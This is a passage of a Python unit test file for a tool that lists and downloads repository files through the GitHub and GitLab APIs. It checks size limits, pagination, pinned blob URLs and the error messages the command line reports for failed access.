                [self.entry(size=1), self.entry("other.py", size=1)],
                "source byte limit",
            ),
        ):
            with (
                self.subTest(limit=limit),
                mock.patch.object(remote_sources, limit, value),
            ):
                read = mock.Mock(side_effect=[self.listing(entries), b"x"])
                files, exclusions = remote_sources.select_files(
                    "github.com", "example/project", "a" * 40, sources.Budget(), read
                )
                self.assertEqual(list(files), ["app.py"])
                self.assertEqual([row["reason"] for row in exclusions], [reason])
                self.assertEqual(read.call_count, 2)

    def test_selected_source_size_mismatch_fails_without_a_score(self):
        read = mock.Mock(side_effect=[self.listing([self.entry(size=1)]), b"too large"])
        with self.assertRaisesRegex(sources.SourceError, "listed size"):
            remote_sources.select_files(
                "github.com", "example/project", "a" * 40, sources.Budget(), read
            )

    def test_authenticated_github_download_stays_on_api_host(self):
        read = mock.Mock(side_effect=[self.listing([self.entry(size=1)]), b"x"])
        remote_sources.select_files(
            "github.com",
            "example/project",
            "a" * 40,
            sources.Budget(),
            read,
            authenticated=True,
        )
        self.assertEqual(
            read.call_args.args[0],
            "https://api.github.com/repos/example/project/git/blobs/" + "b" * 40,
        )

    def test_gitlab_listing_is_paginated_and_sources_use_pinned_blob_ids(self):
        rows = [
            {"path": f"file-{i}.bin", "type": "blob", "mode": "100644"}
            for i in range(100)
        ]
        read = mock.Mock(
            side_effect=[
                json.dumps(rows).encode(),
                json.dumps(
                    [
                        {
                            "path": "app.py",
                            "type": "blob",
                            "mode": "100755",
                            "id": "b" * 40,
                        }
                    ]
                ).encode(),
                b"x",
            ]
        )
        files, _ = remote_sources.select_files(
            "gitlab.com", "group/team/project", "a" * 40, sources.Budget(), read
        )
        self.assertTrue(files["app.py"]["executable"])
        self.assertIn("page=2", read.call_args_list[1].args[0])
        self.assertEqual(
            read.call_args.args[0],
            "https://gitlab.com/api/v4/projects/group%2Fteam%2Fproject/repository/blobs/"
            + "b" * 40
            + "/raw",
        )

    def test_missing_inaccessible_and_rate_limited_repositories_have_clear_errors(self):
        for status, expected in (
            (404, "not found or not accessible"),
            (401, "authentication failed"),
            (403, "access denied or API rate limit"),
            (429, "API rate limit"),
            (0, "connection failed"),
        ):
            with (
                self.subTest(status=status),
                mock.patch.object(remote, "get", return_value=(None, status)),
            ):
                output, errors = io.StringIO(), io.StringIO()
                with (
                    contextlib.redirect_stdout(output),
                    contextlib.redirect_stderr(errors),
                ):
                    result = cli.main(["https://github.com/example/project", "--json"])
                self.assertEqual(result, 1)
                self.assertEqual(output.getvalue(), "")
                self.assertIn(expected, errors.getvalue())
                self.assertIn("No score", errors.getvalue())


if __name__ == "__main__":
    unittest.main()
